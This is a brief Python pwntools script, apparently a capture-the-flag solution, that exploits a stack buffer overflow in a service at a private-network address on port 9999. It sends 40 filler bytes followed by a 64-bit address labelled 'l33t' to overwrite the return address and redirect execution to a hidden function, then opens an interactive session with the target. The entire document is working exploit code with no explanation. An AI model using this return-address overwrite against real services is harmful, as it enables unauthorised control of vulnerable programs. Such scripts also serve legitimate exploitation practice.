#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.6"
port = 9999

r = remote(host,port)

l33t = 0x000000000400646
payload = "a"*40 + p64(l33t)
r.recvuntil(":")
raw_input()
r.sendline(payload)
r.interactive()
